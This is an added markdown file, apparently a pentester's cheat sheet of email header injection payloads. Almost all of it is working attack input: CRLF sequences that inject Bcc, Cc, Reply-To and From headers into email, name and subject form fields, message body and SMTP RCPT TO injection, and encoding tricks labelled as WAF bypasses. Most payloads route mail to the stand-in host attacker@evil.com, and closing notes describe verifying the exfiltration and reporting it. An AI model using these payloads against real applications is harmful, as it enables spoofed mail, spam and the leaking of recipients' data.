@@ -1,0 +1,69 @@
+# Email Header Injection Payloads
+
+## CRLF NEWLINES (%0d%0a / \r\n)
+Core injection — add header lines:
+```
+%0d%0aBcc: attacker@evil.com
+%0d%0aCc: attacker@evil.com
+%0d%0aReply-To: attacker@evil.com
+%0d%0aTo: attacker@evil.com
+%0d%0aFrom: admin@target.com
+%0d%0aSubject: INJECTED
+%0d%0aX-Test: injected
+```
+Combined (dump full headers):
+```
+x@y.com%0d%0aBcc: attacker@evil.com
+```
+
+## Full message body injection (send arbitrary mail)
+```
+%0d%0a%0d%0a<html><body>NEW MESSAGE BODY</body></html>
+```
+Newline+blank-line ends headers → body.
+
+## In fields expected by the app
+### email
+```
+victim@target.com%0d%0aBcc: attacker@evil.com
+victim@target.com%0d%0aCc:hacker@evil.com
+victim@target.com%0d%0aSubject: Resetted
+```
+### name
+```
+John%0d%0aBcc: attacker@evil.com
+John%0d%0aReply-To: attacker@evil.com
+```
+### subject
+```
+Hi=%0d%0aBcc: spamtrap@evil.com
+```
+
+## SMTP protocol trick (if form builds SMTP envelope directly)
+```
+RCPT TO: victim@target.com%0d%0aRCPT TO: attacker@evil.com
+```
+
+## Encoding variants (WAF bypass)
+```
+%0a%0d  (LF CR, order swapped)
+%09 (tab) instead of space
+\u000d\u000a  (unicode CRLF — old .net)
+%0D%0A URL-decoded by some parsers
+\r\n literal in JSON body is often passed raw → try:
+"email":"x@y.com\r\nBcc: attacker@evil.com"
+```
+
+## HTML / header-smuggling in the "sender name"
+```
+"Name <attacker@evil.com>"
+"Name\r\nBcc: attacker@evil.com"  (quoted-printable)
+```
+
+## Verification
+- Send, then check your receiving mailbox at `attacker@evil.com` for a copy (Bcc header).
+- If the app blocks `%0d%0a`, test newline inside JSON (some parsers allow raw CRLF in body).
+
+## Report note
+- Show the injected email arriving to your address + the full Received/To/Cc headers screenshot.
+- Severity: with `Bcc` you can exfil every other recipient of that list (e.g. newsletter = large-scale leak).
